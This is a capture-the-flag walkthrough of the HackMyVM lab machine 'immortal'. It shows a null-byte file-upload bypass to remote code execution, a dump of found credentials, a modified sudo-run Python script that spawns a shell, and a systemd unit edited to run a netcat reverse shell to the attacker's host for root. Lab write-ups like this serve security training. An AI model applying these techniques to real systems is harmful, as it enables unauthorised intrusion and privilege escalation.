# immortal - A HackMyVM Machine

MACHINE IP: 192.168.1.14

HOST NAME: immortal.hmv

Potential usernames: David, Drake, found on ftp.

So the password of the login page on port 80 is **PASSWORD**, found by bruteforcing.

Risky Functionality of file upload found on: ***http://immortal.hmv/upload_an_incredible_message.php***

Now, it seems that a lot of files are blacklisted on the website. But using a tool [fuxploider](https://github.com/almandin/fuxploider) I managed to find that writing php code in this particular file format
***file_upload.gif%00.phtml*** allowed us to gain RCE.

The user flag is located at */home/drake* -> **FLAGHERE**

/etc/crontab contains a cron job which is flagged as a PE vector by linpeas.sh. Let's check it out.

On re-analysing the linpeas.sh scan, I found a suspicious file hidden in /home/drake/.../pass.txt
The file contents:
```
netflix : drake123
amazon : 123drake
shelldred : shell123dred (f4ns0nly)
system : kevcjnsgii
bank : myfavouritebank
nintendo : 123456
```

So, I assume we can use these credentials to bruteforce the password to drake. The password is **PASSWORD**.

On running sudo -l
```bash
Matching Defaults entries for drake on Immortal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User drake may run the following commands on Immortal:
    (eric) NOPASSWD: /usr/bin/python3 /opt/immortal.py
```

So I modified /opt/immortal.py to spawn a shell. Since this can be run as root, we can get a root shell, which didnt end up working.

Because, the shell that I have is very buggy, I logged in as drake using ssh.

Now in the output of sudo -l we can see that we can run a command as the user eric.

So let's use this particular command to do so:
```bash
sudo -u eric /usr/bin/python3 /opt/immortal.py
```

I modified the python script to include a shell payload as follows before running the above command:
```python
import pty
a = input(str("Do you want to be immortal: "))

if a.lower() == "yes" or a.lower() == "no":
   print("Bad answer")
else:
   print("Are you sure?")
   print("[+] Spawning shell")
   pty.spawn("/bin/bash")
```

If you run this command after making the above modification we can get a shell on the eric user.

We dont need to upgrade this shell as we're using pty.

Running sudo -l on this user we get this output:
```bash
Matching Defaults entries for eric on Immortal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User eric may run the following commands on Immortal:
    (root) NOPASSWD: sudoedit /etc/systemd/system/immortal.service
    (root) NOPASSWD: /usr/bin/systemctl start immortal.service
    (root) NOPASSWD: /usr/bin/systemctl stop immortal.service
    (root) NOPASSWD: /usr/bin/systemctl enable immortal.service
    (root) NOPASSWD: /usr/bin/systemctl disable immortal.service
    (root) NOPASSWD: /usr/bin/systemctl daemon-reload
```

I can see the sudoedit command which can be executed as root. So maybe we can modify that file in order to gain a root shell on the machine.
Change the contents of /etc/systemd/system/immortal.service

```bash
[Unit]
Description=Immortal Service
After=network.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'exec nc 192.168.1.10 5555 -e /bin/sh'

[Install]
WantedBy=multi-user.target
```

Start a listener on the attacker machine, on port 5555 and start the service after this. We will obtain a root shell. Get the root flag.

